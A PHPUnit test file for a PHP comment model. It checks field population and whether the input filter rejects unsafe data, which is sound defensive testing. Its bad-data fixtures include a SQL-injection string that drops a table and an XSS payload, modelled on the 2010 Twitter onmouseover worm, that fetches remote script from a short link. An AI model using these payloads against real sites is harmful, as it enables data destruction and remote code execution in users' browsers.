<?php
namespace Phpqa\Tests\Model;

use Phpqa\Model\Comment;

class CommentTest extends \PHPUnit_Framework_TestCase
{
    /**
     * @dataProvider goodDataProvider
     */
    public function testModelIsPopulatedAtConstruct($data)
    {
        $comment = new Comment($data);
        $this->assertSame($data['commentId'], $comment->getCommentId());
        $this->assertSame($data['fullName'], $comment->getFullName());
        $this->assertSame($data['emailAddress'], $comment->getEmailAddress());
        $this->assertSame($data['website'], $comment->getWebsite());
        $this->assertSame($data['comment'], $comment->getComment());
    }

    /**
     * Provides data that we consider to be safe and of quality
     * @return array
     */
    public function goodDataProvider()
    {
        $faker = \Faker\Factory::create();
        $data = [];
        for ($iter = 0; $iter < 500; $iter++) {
            $data[] = [
                'commentId'    => rand(1, time()),
                'fullName'     => $faker->name,
                'emailAddress' => $faker->email,
                'website'      => $faker->url,
                'comment'      => $faker->text(),
            ];
        }
        return $data;
    }

    /**
     * Provides data that we consider to be unsafe
     * @return array
     */
    public function badDataProvider()
    {
        return [
            [
                [
                    'commentId'    => 0,
                    'fullName'     => '',
                    'emailAddress' => '',
                    'website'      => '',
                    'comment'      => '',
                ]
            ],[
                [
                    'commentId'    => 'Little Bobby Tables',
                    'fullName'     => 'Robert\'); DROP TABLE `students`; --',
                    'emailAddress' => 'clickjack@hackers',
                    'website'      => "http://t.co/@\"style=\"font-size:999999999999px;\"onmouseover=\"$.getScript('http:\u002f\u002fis.gd\u002ffl9A7')\"/",
                    'comment'      => 'exploit twitter 9/21/2010',
                ]
            ],
        ];
    }

    /**
     * @dataProvider badDataProvider
     */
    public function testCommentIsProtectedAgainstHacks($data)
    {
        $comment = new Comment();
        $comment->getInputFilter()->setData($data);
        $this->assertFalse($comment->getInputFilter()->isValid());
    }
}
